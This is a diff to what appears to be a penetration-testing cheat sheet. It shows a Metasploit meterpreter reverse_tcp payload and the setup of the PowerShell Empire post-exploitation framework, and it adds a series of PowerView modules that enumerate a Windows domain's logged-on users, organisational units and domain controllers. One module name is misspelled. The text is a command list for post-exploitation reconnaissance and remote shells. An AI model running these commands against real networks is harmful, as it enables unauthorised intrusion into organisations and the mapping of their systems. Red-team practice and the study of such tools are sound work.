@@ -100,7 +100,7 @@ payload => windows/meterpreter/reverse_tcp > run
 
 
 ---------------------------------------------------------------
-POWERSHeLL eMPIRe -- Post-Exploitation Framework
+POWERSHeLL eMPIRe -- Post-Exploitation Framework - DOMAIN CONTROLLER
 
 cd /opt
 git clone https://github.com/BC-SECURITY/Empire.git
@@ -132,5 +132,21 @@ usemodule situational_awareness/network/powerview/get_user
 (enumerates all users)
 back
 usemodule situational_awareness/network/powerview/get_computer
+execute
+back
+usemodule situational_awareness/network/powerview/get_loggedon
+execute
+back
+usemodule situational_awareness/network/powerview/procecss_hunter
+execute
+back
+usemodule situational_awareness/network/powerview/get_ou
+execute
+back
+usemodule situational_awareness/network/powerview/get_domain_controller
+execute
+back
+
+
 
 
